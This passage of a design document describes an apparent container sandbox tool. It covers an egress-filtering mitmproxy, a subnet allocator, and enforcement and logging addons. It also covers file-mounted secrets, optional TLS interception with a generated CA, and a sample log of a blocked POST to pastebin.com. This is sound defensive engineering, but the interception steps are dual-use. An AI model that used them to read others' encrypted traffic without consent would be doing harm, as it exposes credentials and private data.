# Reload policy (hot-reload without restart)
cell proxy reload

# Status
cell proxy status
```

### Policy Reload Semantics

`cell proxy reload` triggers a hot-reload of the network policy without restarting the proxy container:

1. Sends `SIGHUP` to the mitmproxy process
2. mitmproxy reloads the policy YAML file
3. New connections use the new policy immediately
4. Existing connections continue with their original policy until they close

**Important:** There is NO window where enforcement is disabled. During reload:
- In-flight requests complete with the old policy
- New requests use the new policy
- Default-deny is always active

**Verification:**
```bash
# Confirm reload succeeded
cell proxy logs --tail 10 | grep -i reload
# Should show: "Policy reloaded: X allow rules, Y deny rules"
```

### Deployment Mode

**Shared proxy (default):** One proxy container connects to all cell networks.

```
┌─────────────┐  ┌─────────────┐  ┌─────────────┐
│   cell-a    │  │   cell-b    │  │   cell-c    │
│   Cell A    │  │   Cell B    │  │   Cell C    │
│      │      │  │      │      │  │      │      │
│  ┌───┴───┐  │  │  ┌───┴───┐  │  │  ┌───┴───┐  │
│  │ Proxy │──┼──┼──│ Proxy │──┼──┼──│ Proxy │  │  (same container)
│  └───────┘  │  │  └───────┘  │  │  └───────┘  │
└─────────────┘  └─────────────┘  └─────────────┘
        │                │                │
        └────────────────┴────────────────┘
                         │
                  proxy-external
                         │
                     Internet
```

### What It Does

| Function | Description |
|----------|-------------|
| Route traffic | All cell HTTP/HTTPS goes through it |
| Enforce policy | Block requests to non-allowed domains |
| Log requests | Record URL, status, timing per cell |
| Cell identification | Track which cell made each request (via source subnet) |

### Proxy Startup

The proxy starts on the external network only. It joins cell networks as cells are created.

```bash
# /usr/local/bin/cell-proxy-start.sh
#!/bin/bash
set -eu

# === SINGLE SOURCE OF TRUTH FOR PROXY IMAGE ===
# To update:
#   1. podman pull mitmproxy/mitmproxy:10.2.4
#   2. podman inspect mitmproxy/mitmproxy:10.2.4 --format '{{.Digest}}'
#   3. Replace digest below
#   4. Test in staging
# Last verified: 2026-02-01
MITMPROXY_IMAGE="mitmproxy/mitmproxy@sha256:REPLACE_WITH_REAL_DIGEST"

# Proxy resource limits (prevents DoS from high-traffic cells)
PROXY_MEMORY="1g"
PROXY_CPUS="1"
PROXY_PIDS="256"
PROXY_NOFILE="8192"

# Pull image (digest-pinned)
podman pull "$MITMPROXY_IMAGE"

podman run -d \
  --name proxy \
  --network proxy-external \
  --user 1000:1000 \
  --read-only \
  --security-opt=no-new-privileges \
  --cap-drop=ALL \
  --sysctl net.ipv4.ip_forward=0 \
  --memory="$PROXY_MEMORY" \
  --cpus="$PROXY_CPUS" \
  --pids-limit="$PROXY_PIDS" \
  --ulimit nofile="$PROXY_NOFILE":"$PROXY_NOFILE" \
  --tmpfs /tmp:rw,noexec,nosuid,nodev,size=128m \
  --tmpfs /home/mitmproxy:rw,noexec,nosuid,nodev,size=64m \
  -v /var/log/cells/network:/logs:rw \
  -v /var/run/cells:/var/run/cells:ro \
  -v /cells/addons:/addons:ro \
  -v /cells/network-policy.yaml:/policy.yaml:ro \
  "$MITMPROXY_IMAGE" \
  mitmdump -s /addons/enforce.py -s /addons/logger.py

# Rebuild subnet map from persistent state (in case of restart)
/usr/local/bin/cell-rebuild-subnet-map.sh
```

### Image Provenance and Rotation

**Operational process for updating the proxy image:**

1. **Monthly review:** Check for mitmproxy security updates
2. **Pull and verify:**
   ```bash
   podman pull mitmproxy/mitmproxy:latest
   # Review changelog for security fixes
   # Test in staging environment
   ```
3. **Get new digest:**
   ```bash
   podman inspect mitmproxy/mitmproxy:latest --format '{{.Digest}}'
   ```
4. **Update pinned digest** in `cell-proxy-start.sh`
5. **Restart proxy:** `cell proxy restart`

**Never use `:latest` in production** — always pin to a verified digest.

### Cell Attribution (Subnet Allocator)

Each cell network gets a unique /24 subnet. The `cell` CLI manages a persistent allocator to ensure uniqueness and stable attribution.

**Allocation state file:** `/state/system/subnets.json` (persistent, survives VM reboot)

```json
{
  "next_index": 4,
  "allocated": {
    "cell-abc123": {"subnet": "10.60.1.0/24", "created": "2026-02-01T10:00:00Z"},
    "cell-def456": {"subnet": "10.60.2.0/24", "created": "2026-02-01T10:05:00Z"},
    "cell-ghi789": {"subnet": "10.60.3.0/24", "created": "2026-02-01T10:10:00Z"}
  },
  "freed": []
}
```

**Subnet mapping file:** `/var/run/cells/subnet-map.json` (read by proxy)

```json
{
  "10.60.1.0/24": "cell-abc123",
  "10.60.2.0/24": "cell-def456",
  "10.60.3.0/24": "cell-ghi789"
}
```

**Allocator logic (in `cell` CLI):**

```python
# Simplified subnet allocator
import json
import fcntl
from pathlib import Path
from datetime import datetime

SUBNET_BASE = "10.60"  # 10.60.0.0/16 reserved for cells
MAX_SUBNET_INDEX = 254  # Hard limit: 10.60.1.0/24 through 10.60.254.0/24
STATE_FILE = Path("/state/system/subnets.json")  # Persistent (survives reboot)
MAP_FILE = Path("/var/run/cells/subnet-map.json")  # Runtime (for proxy)
LOCK_FILE = Path("/var/run/cells/allocator.lock")  # Single lock for both files

class SubnetExhaustedError(Exception):
    """Raised when all subnets are allocated."""
    pass

def allocate_subnet(cell_name: str) -> str:
    """Allocate a unique /24 subnet for a cell."""
    with open(LOCK_FILE, "w") as lock:
        fcntl.flock(lock, fcntl.LOCK_EX)  # Exclusive lock for BOTH files
        
        with open(STATE_FILE, "r") as f:
            state = json.load(f)
        
        # Check if already allocated (idempotent)
        if cell_name in state["allocated"]:
            return state["allocated"][cell_name]["subnet"]
        
        # Reuse freed subnet if available
        if state["freed"]:
            index = state["freed"].pop(0)
        else:
            index = state["next_index"]
            # CRITICAL: Enforce pool bounds
            if index > MAX_SUBNET_INDEX:
                raise SubnetExhaustedError(
                    f"All {MAX_SUBNET_INDEX} subnets allocated. "
                    f"Remove unused cells with 'cell rm' to free subnets."
                )
            state["next_index"] += 1
        
        subnet = f"{SUBNET_BASE}.{index}.0/24"
        state["allocated"][cell_name] = {
            "subnet": subnet,
            "created": datetime.utcnow().isoformat() + "Z"
        }
        
        # Atomic write to state file
        tmp_state = STATE_FILE.with_suffix('.tmp')
        with open(tmp_state, "w") as f:
            json.dump(state, f)
        tmp_state.rename(STATE_FILE)
        
        # Update mapping file for proxy (still under lock)
        _update_subnet_map(state["allocated"])
        
        return subnet

def free_subnet(cell_name: str):
    """Return subnet to pool when cell is removed."""
    with open(LOCK_FILE, "w") as lock:
        fcntl.flock(lock, fcntl.LOCK_EX)
        
        with open(STATE_FILE, "r") as f:
            state = json.load(f)
        
        if cell_name in state["allocated"]:
            subnet = state["allocated"][cell_name]["subnet"]
            index = int(subnet.split(".")[2])  # Extract index from 10.60.X.0/24
            
            # Prevent duplicate indices in freed list (crash + retry safety)
            if index not in state["freed"]:
                state["freed"].append(index)
                state["freed"].sort()  # Keep sorted for predictable allocation
            
            del state["allocated"][cell_name]
            
            # Atomic write
            tmp_state = STATE_FILE.with_suffix('.tmp')
            with open(tmp_state, "w") as f:
                json.dump(state, f)
            tmp_state.rename(STATE_FILE)
            
            _update_subnet_map(state["allocated"])

def _update_subnet_map(allocated: dict):
    """Update the subnet-to-cell mapping file read by proxy (atomic write)."""
    mapping = {v["subnet"]: k for k, v in allocated.items()}
    tmp_file = MAP_FILE.with_suffix('.tmp')
    with open(tmp_file, "w") as f:
        json.dump(mapping, f)
    tmp_file.rename(MAP_FILE)  # Atomic on POSIX
```

**Network creation with explicit subnet:**

```bash
# cell run internally does:
SUBNET=$(cell allocate-subnet $CELL_NAME)  # e.g., "10.60.5.0/24"
podman network create --internal --subnet "$SUBNET" "cell-$CELL_NAME"
```

**Why this matters:**
- Subnets are deterministic, not random
- Freed subnets are reused (prevents exhaustion)
- Mapping is versioned by creation time for log correlation
- File locking prevents race conditions
- **Pool bounds are enforced** — allocator fails cleanly at 254 subnets

**Limitation:** The `10.60.X.0/24` scheme allows up to 254 unique subnets (X = 1-254, index 0 reserved). For high-turnover environments, ensure cells are properly removed (freeing subnets for reuse). To support more cells, expand to multiple /16 ranges (e.g., `10.60.0.0/16`, `10.61.0.0/16`).

### Hardening (Defense in Depth)

The proxy has two layers of protection:

**Layer 1: Application-level policy** (mitmproxy addons)

```python
# addons/enforce.py - Combined enforcement addon
from mitmproxy import http
import ipaddress
import json
import yaml
from pathlib import Path
import os
import signal

# Extended internal ranges (includes CGNAT, benchmarking, reserved)
INTERNAL_RANGES = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),    # link-local
    ipaddress.ip_network('100.64.0.0/10'),     # CGNAT
    ipaddress.ip_network('198.18.0.0/15'),     # Benchmarking
    ipaddress.ip_network('240.0.0.0/4'),       # Reserved (Class E)
]

ALLOWED_PORTS = {80, 443}
POLICY_FILE = Path("/policy.yaml")

class EnforcePolicy:
    def __init__(self):
        self.allow_patterns = []
        self.deny_patterns = []
        self.policy_mtime = 0
        self._load_policy()
        # Register SIGHUP handler for hot-reload
        signal.signal(signal.SIGHUP, self._handle_sighup)
    
    def _handle_sighup(self, signum, frame):
        """Handle SIGHUP for policy hot-reload."""
        self._load_policy()
        print(f"Policy reloaded: {len(self.allow_patterns)} allow rules, {len(self.deny_patterns)} deny rules")
    
    def _load_policy(self):
        """Load or reload policy from YAML file."""
        try:
            with open(POLICY_FILE) as f:
                policy = yaml.safe_load(f)
            self.allow_patterns = policy.get('allow', [])
            self.deny_patterns = policy.get('deny', [])
            self.default_action = policy.get('default', 'deny')
            self.policy_mtime = os.path.getmtime(POLICY_FILE)
        except Exception as e:
            print(f"ERROR loading policy: {e}")
            # On error, fail closed
            self.allow_patterns = []
            self.deny_patterns = []
            self.default_action = 'deny'
    
    def _matches_allowlist(self, hostname: str) -> bool:
        """
        Proper suffix matching with dot boundary.
        '*.github.com' matches 'api.github.com' but NOT 'evilgithub.com'
        """
        hostname = hostname.lower().rstrip('.')
        
        # Check deny list first
        for pattern in self.deny_patterns:
            if self._pattern_matches(hostname, pattern):
                return False
        
        # Then check allow list
        for pattern in self.allow_patterns:
            if self._pattern_matches(hostname, pattern):
                return True
        
        return self.default_action == 'allow'
    
    def _pattern_matches(self, hostname: str, pattern: str) -> bool:
        pattern = pattern.lower().rstrip('.')
        if pattern.startswith('*.'):
            suffix = pattern[1:]  # '.github.com'
            return hostname.endswith(suffix) or hostname == suffix[1:]
        else:
            return hostname == pattern
    
    def request(self, flow: http.HTTPFlow):
        host = flow.request.host
        port = flow.request.port
        
        # Block non-80/443 ports
        if port not in ALLOWED_PORTS:
            flow.response = http.Response.make(
                403, f"Blocked: port {port} not allowed (only 80, 443)")
            return
        
        # Block literal IP addresses
        try:
            ip = ipaddress.ip_address(host)
            # Check internal ranges
            for network in INTERNAL_RANGES:
                if ip in network:
                    flow.response = http.Response.make(
                        403, f"Blocked: internal IP {host}")
                    return
            # Block all direct IP access (must use hostname)
            flow.response = http.Response.make(
                403, f"Blocked: direct IP access not allowed, use hostname")
            return
        except ValueError:
            pass  # It's a hostname, continue
        
        # Validate Host header matches request for HTTP
        if not flow.request.scheme == "https":
            host_header = flow.request.headers.get("Host", "")
            if host_header and host_header.split(":")[0] != host:
                flow.response = http.Response.make(
                    403, f"Blocked: Host header mismatch")
                return
        
        # Check allowlist
        if not self._matches_allowlist(host):
            flow.response = http.Response.make(
                403, f"Blocked: {host} not in allowlist")
            return

addons = [EnforcePolicy()]
```

**Layer 2: VM-level outbound restrictions** (applied during provisioning — see Lima VM Setup section)

### Network Logging

Logs are written to a dedicated directory, not to cell state (proxy should have minimal filesystem access):

```bash
# Log directory structure
/var/log/cells/
├── network/
│   ├── cell-abc123.jsonl
│   ├── cell-def456.jsonl
│   └── unknown.jsonl    # Requests from unidentified sources
└── proxy.log            # Proxy operational logs
```

**Proxy mounts:**
```bash
podman run \
  --name proxy \
  -v /var/log/cells/network:/logs:rw \     # Write only to log dir
  -v /var/run/cells:/var/run/cells:ro \    # Read subnet map (read-only)
  ...
```

### Cell Logger with Attribution (Concurrent-Safe)

```python
# addons/logger.py
from mitmproxy import http
import json
import ipaddress
from datetime import datetime
import os
import fcntl

SUBNET_MAP_FILE = "/var/run/cells/subnet-map.json"
LOG_DIR = "/logs"  # Mounted from /var/log/cells/network

class CellLogger:
    def __init__(self):
        self.subnet_map = {}
        self.map_mtime = 0
        self._reload_subnet_map()
        # Cache of open file handles (one per cell)
        self._log_files = {}
    
    def _reload_subnet_map(self):
        """Reload subnet map if file has changed (hot-reload support)."""
        try:
            current_mtime = os.path.getmtime(SUBNET_MAP_FILE)
            if current_mtime > self.map_mtime:
                with open(SUBNET_MAP_FILE) as f:
                    self.subnet_map = {ipaddress.ip_network(k): v for k, v in json.load(f).items()}
                self.map_mtime = current_mtime
        except (FileNotFoundError, json.JSONDecodeError, OSError):
            pass  # Keep existing map on error
    
    def _resolve_cell(self, client_ip):
        self._reload_subnet_map()  # Check for updates on each request
        try:
            ip = ipaddress.ip_address(client_ip)
            for subnet, cell_name in self.subnet_map.items():
                if ip in subnet:
                    return cell_name
        except Exception:
            pass
        return "unknown"
    
    def _write_log_entry(self, cell_id: str, entry: dict):
        """Write log entry with file locking to prevent corruption under concurrency."""
        log_path = os.path.join(LOG_DIR, f"{cell_id}.jsonl")
        line = json.dumps(entry) + "\n"
        
        # Use file locking to ensure atomic line writes
        # This prevents interleaved/corrupted lines when mitmproxy handles concurrent flows
        with open(log_path, "a") as f:
            fcntl.flock(f, fcntl.LOCK_EX)  # Exclusive lock
            try:
                f.write(line)
                f.flush()  # Ensure written before releasing lock
            finally:
                fcntl.flock(f, fcntl.LOCK_UN)
    
    def response(self, flow: http.HTTPFlow):
        client_ip = flow.client_conn.peername[0]
        cell_id = self._resolve_cell(client_ip)
        
        entry = {
            "ts": datetime.utcnow().isoformat() + "Z",
            "cell": cell_id,
            "src_ip": client_ip,  # Include IP for forensics if cell name unknown
            "method": flow.request.method,
            "host": flow.request.host,
            "path": flow.request.path,
            "status": flow.response.status_code if flow.response else 0,
            "bytes": len(flow.response.content) if flow.response and flow.response.content else 0,
            "ms": round((flow.response.timestamp_end - flow.request.timestamp_start) * 1000) if flow.response else 0,
            "blocked": flow.response.status_code == 403 if flow.response else False
        }
        
        self._write_log_entry(cell_id, entry)

addons = [CellLogger()]
```

### Allowlist Matching

Domain allowlists use **dot-boundary suffix matching** (not naive substring):

```python
def matches_allowlist(hostname, patterns):
    """
    Proper suffix matching with dot boundary.
    '*.github.com' matches 'api.github.com' but NOT 'evilgithub.com'
    """
    hostname = hostname.lower().rstrip('.')
    
    for pattern in patterns:
        pattern = pattern.lower().rstrip('.')
        
        if pattern.startswith('*.'):
            # Wildcard: must match suffix with dot boundary
            suffix = pattern[1:]  # '.github.com'
            if hostname.endswith(suffix) or hostname == suffix[1:]:
                return True
        else:
            # Exact match
            if hostname == pattern:
                return True
    
    return False

# Examples:
# matches_allowlist('api.github.com', ['*.github.com'])  → True
# matches_allowlist('github.com', ['*.github.com'])       → True
# matches_allowlist('evilgithub.com', ['*.github.com'])   → False
# matches_allowlist('evil.github.com.bad.com', ['*.github.com']) → False
```

### SNI/Host Validation (MITM mode)

When MITM is enabled, validate that SNI matches the CONNECT host. This check must happen in the `request` hook (not `tls_clienthello`) because `flow.request` is not yet available at ClientHello time:

```python
def request(self, flow):
    # For CONNECT flows, validate SNI matches CONNECT host
    if flow.request.method == "CONNECT" and flow.client_conn.sni:
        connect_host = flow.request.host
        sni_host = flow.client_conn.sni
        if sni_host != connect_host:
            flow.response = http.Response.make(
                403, f"SNI mismatch: SNI={sni_host}, CONNECT={connect_host}")
            return
```

### HTTPS Visibility

This is an **explicit proxy** setup (cells use `HTTP_PROXY` env var). What you see depends on whether you enable MITM:

| Mode | HTTP | HTTPS |
|------|------|-------|
| **No MITM** (default, recommended) | Full URL, headers, body | Domain only (CONNECT), timing, size |
| **With MITM** (opt-in) | Full URL, headers, body | Full URL, headers, body |

**No MITM** is sufficient for:
- Allowlist enforcement (you see the domain)
- Detecting which APIs cells call
- Rate limiting by domain

**With MITM** adds:
- Full request/response logging for HTTPS
- Request/response transformation
- Content inspection

### Enabling MITM (Advanced, Opt-In)

⚠️ **Warnings:**
- If you log request bodies, you may log secrets (API keys in headers/bodies)
- Log storage becomes sensitive data
- Increases blast radius if proxy is compromised
- Per-cell opt-in is safer than global

**Only enable MITM if you need content inspection.**

**⚠️ Log Redaction Invariant (SECURITY PROPERTY):** When MITM is enabled, `Authorization` headers, `Cookie` headers, and request bodies containing credentials MUST be redacted before persistence. This is **enforced by default** in the logger addon:

```python
# In logger.py - redaction is ALWAYS applied (not optional)
# SECURITY PROPERTY: Any change to this list requires security review
# Tests: test_redaction_authorization, test_redaction_cookie, test_redaction_api_key
REDACT_HEADERS = {'authorization', 'cookie', 'x-api-key', 'x-auth-token', 
                  'x-api-secret', 'api-key', 'bearer'}

def sanitize_headers(headers):
    """Always redact sensitive headers - this is not configurable."""
    return {k: '[REDACTED]' if k.lower() in REDACT_HEADERS else v 
            for k, v in headers.items()}

# Applied automatically in response() before logging:
if self.mitm_enabled:
    entry["request_headers"] = sanitize_headers(dict(flow.request.headers))
    # Never log request/response bodies by default, even with MITM
```

**Redaction tests (must pass before any release):**

```python
# test_redaction.py
def test_redaction_authorization():
    headers = {"Authorization": "Bearer sk-secret123", "Content-Type": "application/json"}
    sanitized = sanitize_headers(headers)
    assert sanitized["Authorization"] == "[REDACTED]"
    assert sanitized["Content-Type"] == "application/json"

def test_redaction_cookie():
    headers = {"Cookie": "session=abc123"}
    assert sanitize_headers(headers)["Cookie"] == "[REDACTED]"

def test_redaction_api_key():
    for header in ["x-api-key", "X-API-KEY", "api-key", "X-Auth-Token"]:
        headers = {header: "secret"}
        assert list(sanitize_headers(headers).values())[0] == "[REDACTED]"
```

**To log bodies (dangerous, requires explicit opt-in):**

```bash
# Set environment variable when starting proxy
CELL_LOG_BODIES=true  # Still redacts headers, but includes body content
```

**1. Generate CA certificate (once, headless-safe):**

```bash
# In proxy container - use mitmdump with immediate exit for headless environments
podman exec proxy sh -c 'mitmdump --mode regular -q &
  sleep 2
  kill %1 2>/dev/null || true'
# CA cert is now at ~/.mitmproxy/mitmproxy-ca-cert.pem

# Copy CA cert to secrets directory for per-cell mounting
podman exec proxy cat /home/mitmproxy/.mitmproxy/mitmproxy-ca-cert.pem > ~/.cells/secrets/mitm-ca.pem
```

**2. Mount CA per-cell (recommended over baking into image):**

```yaml
# cells/debug-cell.yaml - cell that needs MITM inspection
name: debug-cell
image: python:3.11-slim  # Standard image, no CA baked in

secrets:
  - openai-key

# MITM CA mounted only for this cell
mitm: true  # Triggers CA mount and trust setup
```

The `cell run` command handles MITM setup when `mitm: true`:

```bash
# cell run internally does (when mitm: true):
if [ "$MITM_ENABLED" = "true" ]; then
  # Mount CA cert
  MOUNT_ARGS+=("-v" "/secrets/mitm-ca.pem:/usr/local/share/ca-certificates/mitmproxy.crt:ro")
  
  # Run update-ca-certificates on container start
  ENTRYPOINT_WRAPPER="update-ca-certificates 2>/dev/null; exec"
fi
```

**Why per-cell mounting is better than baking into image:**
- Standard images remain standard (no weakened TLS trust)
- MITM is explicit per-cell, not inherited
- Image can be used safely outside Cell environment
- Easier to audit which cells have MITM enabled

**3. Legacy: MITM-enabled base image (not recommended):**

If you must bake the CA into an image (e.g., for distroless):

```dockerfile
# images/cell-mitm/Dockerfile
FROM cell:latest
COPY mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitmproxy.crt
RUN update-ca-certificates
```

⚠️ **Warning:** This image trusts your proxy CA for ALL HTTPS. If reused elsewhere, it weakens TLS trust. Prefer per-cell mounting.

**4. Configure proxy:**

```bash
# Don't use --ssl-insecure in production
# Properly configure certificate paths instead
mitmdump --mode regular \
  --set ssl_verify_upstream_trusted_ca=/etc/ssl/certs/ca-certificates.crt
```

### Logged Data

```json
{"ts":"2026-02-01T10:00:00Z","cell":"my-cell","method":"GET","url":"https://api.github.com/user","status":200,"ms":145}
{"ts":"2026-02-01T10:00:01Z","cell":"my-cell","method":"POST","url":"https://pastebin.com","status":403,"blocked":true}
```

**Default:** Log metadata only (URL, status, timing). Do NOT log request/response bodies unless explicitly needed.

---

## Secrets

Secrets are stored as single-value files on macOS. Cells explicitly declare which secrets they need. Secrets are **mounted as files** into the cell container (read-only). We **do not** inject secret values as environment variables.

This avoids common leaks via `ps`, `podman inspect`, crash dumps, and debug logs. If a tool inside the cell wants the secret, it reads it from a file.

### Secrets Directory (macOS)

```
~/.cells/secrets/
├── openai-key.txt        # Contains just: sk-...
├── anthropic-key.txt     # Contains just: sk-ant-...
├── github-token.txt      # Contains just: ghp_...
└── db-password.txt       # Contains just: hunter2
```

**One file = one secret.** No parsing, no multi-value files.

### Declaring Secrets in Cell Definition

```yaml
# cells/research-agent.yaml
name: research-agent
secrets:
  - openai-key
  - anthropic-key
```

```yaml
# cells/github-bot.yaml
name: github-bot
secrets:
  - github-token
```

### How Secrets Are Mounted

For a cell that declares `openai-key`, the runner mounts:

- Host (macOS): `~/.cells/secrets/openai-key.txt`
- Guest (Lima VM): same path (via the Lima mount)
- Container: `/run/secrets/openai-key` (read-only)

Example `podman run` fragment:

```bash
# For each declared secret:
#   - mount it read-only (from VM path /secrets/)
#   - optionally provide *_FILE env vars pointing to the file path (NOT the secret value)
-v "/secrets/openai-key.txt:/run/secrets/openai-key:ro" \
-e OPENAI_KEY_FILE=/run/secrets/openai-key
```

**Conventions**
- Container secret paths are always `/run/secrets/<secret-name>`.
- The runner may add `<n>_FILE=/run/secrets/<secret-name>` for convenience.
- The runner must never put secret values in env vars.

### Non-goals

- Cell does not attempt to prevent a compromised workload from exfiltrating secrets via allowed egress. The goal is **least privilege + observability**, not perfect DLP.
- If you enable TLS MITM, treat proxy logs as sensitive and avoid logging bodies/headers that may contain secrets.
- **Secrets are readable by root inside the container.** There is no per-process isolation of secrets within a cell. Any code running in the cell can read any secret mounted into that cell. This is by design—cells are the isolation boundary, not processes within cells.

---

## Observability

### Logs

```bash
# Stream stdout
cell logs my-cell -f

# Stream stderr
cell logs my-cell -f --stderr

# Both
cell logs my-cell -f --all
```

### Network

```bash
# Stream
cell network my-cell -f

# Filter
cell network my-cell --json | jq 'select(.blocked)'
cell network my-cell --json | jq 'select(.ms > 1000)'

# Export
cell network my-cell --json > network.jsonl
```

**Note:** `cell network` reads from `/var/log/cells/network/{cell}.jsonl` inside the VM. The proxy writes these logs; cells cannot modify them.

### Files

```bash
# List
cell files my-cell
cell files my-cell /work/output

# View
cell cat my-cell /work/result.json

# Copy out
cell cp my-cell:/work/result.json ./result.json

# Copy in (while running)
cell cp ./new-task.json my-cell:/work/task.json
```

---

## Workflows

### Interactive Development

```bash
# Get a shell
cell run --name dev --image python:3.11-slim -it

# Edit files in ~/.cells/state/dev/workspace/
# They appear at /work in the cell
```

### Run Task and Collect Output

```bash
cell run -f cells/task.yaml
cell wait task
cell cp task:/work/output.json ./output.json
cell rm task
```

### Multiple Cells

```bash
# Start several
cell run -f cells/cell-a.yaml --detach
cell run -f cells/cell-b.yaml --detach
cell run -f cells/cell-c.yaml --detach

# Watch all
cell logs --all -f

# Stop all
cell stop --all
```

---

## State Isolation

Each cell's state is completely separate:

```
~/.cells/state/
├── cell-a/
│   ├── workspace/      # Only cell-a can see this
│   ├── stdout.log
│   └── stderr.log
├── cell-b/
│   ├── workspace/      # Only cell-b can see this
│   └── ...
└── cell-c/
    ├── workspace/      # Only cell-c can see this
    └── ...
```

Cell A's container mounts only `/state/cell-a/workspace` → `/work`.
It cannot see or access `/state/cell-b/` or `/state/cell-c/`.

**Network logs** are stored separately in `/var/log/cells/network/{cell}.jsonl` (inside VM) and are not accessible to cells.

---

## Long-Running Cells

Cells can run continuously. Here's how to manage them.

### Restart Policy

```yaml
# In cell definition
restart: unless-stopped
```

| Policy | Behavior |
|--------|----------|
| `no` | Don't restart (default, for batch jobs) |
| `on-failure` | Restart if exit code ≠ 0 |
| `unless-stopped` | Always restart unless you explicitly stop |
| `always` | Always restart, even after reboot |

### Restart Policy and VM Restarts

**Important:** Podman restart policies work *while Podman is running*. After a Lima VM restart:

| Restart Policy | Auto-starts after VM reboot? |
|----------------|------------------------------|
| `always` | ✅ Yes (with podman-restart.service enabled) |
| `unless-stopped` | ✅ Yes (with podman-restart.service enabled) |
| `on-failure` | ❌ No |
| `no` | ❌ No |

**Proxy ordering is enforced by systemd:**

The `cell-proxy.service` is configured with `Before=podman-restart.service`, ensuring the proxy starts before any cells with restart policies. This prevents the confusing state where cells run but have no network.

If you manually restart the VM:

```bash
cell vm restart    # VM reboots
# Proxy starts automatically (systemd)
# Cells with restart policy start automatically (podman-restart.service)
```

### Log Rotation

Logs grow unbounded for long-running cells. Rotation is configured automatically during VM provisioning (see Lima VM Setup). The configuration uses `copytruncate` which:
- Truncates the log file in place (no move/rename)
- Signals the proxy via `postrotate` to continue writing cleanly
- Avoids race conditions with active writers

### Health Checks

For cells that run internal HTTP services (e.g., a web server or API), add a health check:

```yaml
# In cell definition (only for cells that expose an HTTP endpoint)
healthcheck:
  type: http  # or 'process'
  command: ["curl", "-f", "http://localhost:8080/health"]
  interval: 30s
  timeout: 5s
  retries: 3
  start_period: 10s  # Grace period before health checks start
```

**⚠️ Important:** The healthcheck command must exist in the container image. Most minimal images (`python:slim`, `alpine`, `distroless`) do **not** include `curl`. Options:

1. Use a tool that exists in the image (e.g., `wget` in alpine, `python` for HTTP checks)
2. Add the tool to a custom image
3. Use process-based healthchecks instead (see below)

**Example healthchecks for minimal images:**

```yaml
# Alpine (has wget, not curl)
healthcheck:
  type: http
  command: ["wget", "-q", "--spider", "http://localhost:8080/health"]

# Python image (use python for HTTP check)
healthcheck:
  type: http
  command: ["python", "-c", "import urllib.request; urllib.request.urlopen('http://localhost:8080/health')"]
```

**Note:** This only applies to cells that run a server process. For batch jobs or non-server workloads, use process-based health checks instead:

```yaml
healthcheck:
  type: process
  command: ["pgrep", "-f", "my-worker-process"]
  interval: 30s
```

**Preventing healthcheck restart loops:**

If a cell fails healthchecks repeatedly, Podman will restart it (if restart policy is set). To prevent noisy restart loops:

```yaml
# Add backoff via restart policy
restart: on-failure
restart_max_attempts: 3  # Stop trying after 3 failures
restart_window: 300s     # Reset failure count after 5 minutes of success
```

### What Survives Lima VM Restart

| Data | Survives? | Location |
|------|-----------|----------|
| Cell workspaces | ✅ Yes | `~/.cells/state/` on Mac |
| Cell logs | ✅ Yes | Same |
| Network logs | ✅ Yes | Same |
| Cell configs | ✅ Yes | `~/.cells/cells/` on Mac |
| Secrets | ✅ Yes | `~/.cells/secrets/` on Mac |
| Proxy config | ✅ Yes | Mounted from Mac |
| Subnet allocator state | ✅ Yes | `/state/system/subnets.json` |
| **Running containers** | ❌ No | Must restart |
| **Cell networks** | ❌ No | Recreated on cell start |
| **Runtime subnet map** | ❌ No | Rebuilt from allocator state |

**Note on subnet attribution:** The allocator state (`/state/system/subnets.json`) persists across reboots, ensuring consistent subnet assignment. The runtime mapping (`/var/run/cells/subnet-map.json`) is rebuilt as cells restart. Additionally, each log entry includes both the cell name and source IP for forensic correlation.

### Cell Lifecycle and Network Management

`cell rm` must handle cleanup correctly to avoid race conditions:

```bash
# cell rm CELL_NAME does:
1. Stop the cell container (graceful, then force)
2. Wait for container to fully stop
3. Disconnect proxy from cell's network
4. Remove the cell's network
5. Free the subnet (update allocator state)
6. Update subnet-map.json
7. Optionally remove workspace (--purge flag)
```

**Race condition prevention:**
- Always stop container before network operations
- Use `podman wait` to ensure container is stopped
- Retry network disconnect if proxy is restarting

### Monitoring Long-Running Cells

```bash
# Check all cell status
cell list

# Watch resource usage
cell stats

# Check if cell is healthy
cell health my-cell
```

---

## Security Invariants

These are the rules that must hold for the security model to work. Violations break your guarantees.

### Invariant 1: No East-West Traffic (Per-Cell Networks)

**Rule:** Cells cannot talk to each other directly. Period.

**Implementation:** Each cell gets its own isolated network. The proxy joins all cell networks. No iptables guesswork — isolation by topology.

```
┌─────────────────────────────────────────────────────────────────┐
│                          Lima VM                                 │
│                                                                  │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐           │
│  │   cell-a     │  │   cell-b     │  │   cell-c     │           │
│  │ (--internal) │  │ (--internal) │  │ (--internal) │           │
│  │  ┌────────┐  │  │  ┌────────┐  │  │  ┌────────┐  │           │
│  │  │ Cell A │  │  │  │ Cell B │  │  │  │ Cell C │  │           │
│  │  └───┬────┘  │  │  └───┬────┘  │  │  └───┬────┘  │           │
│  │      │       │  │      │       │  │      │       │           │
│  │  ┌───┴────┐  │  │  ┌───┴────┐  │  │  ┌───┴────┐  │           │
│  │  │ Proxy  │  │  │  │ Proxy  │  │  │  │ Proxy  │  │           │
│  │  └────────┘  │  │  └────────┘  │  │  └────────┘  │           │
│  └──────────────┘  └──────────────┘  └──────────────┘           │
│                              │                                   │
│                    ┌─────────┴─────────┐                        │
│                    │   proxy-external   │                        │
│                    └─────────┬─────────┘                        │
└──────────────────────────────┼───────────────────────────────────┘
                               ▼
                           Internet
```

**Why this is better than iptables:**
- Isolation by topology, not firewall rules
- Works regardless of Podman backend (CNI, netavark)
- No chain ordering issues, no hardcoded IPs
- Self-evidently correct

**Cell creation (what `cell run` does internally):**

```bash
CELL_NAME="cell-abc123"

# 1. Create isolated network for this cell
podman network create --internal "cell-${CELL_NAME}"

# 2. Connect proxy to this cell's network
podman network connect "cell-${CELL_NAME}" proxy

# 3. Run cell on its own network (proxy DNS name resolves)
podman run --runtime=runsc --name "$CELL_NAME" \
  --network "cell-${CELL_NAME}" \
  -e HTTP_PROXY=http://proxy:8080 \
  ...

# 4. On cell removal, disconnect and delete network
podman network disconnect "cell-${CELL_NAME}" proxy
podman network rm "cell-${CELL_NAME}"
```

**Verification (self-test in provisioning):**

```bash
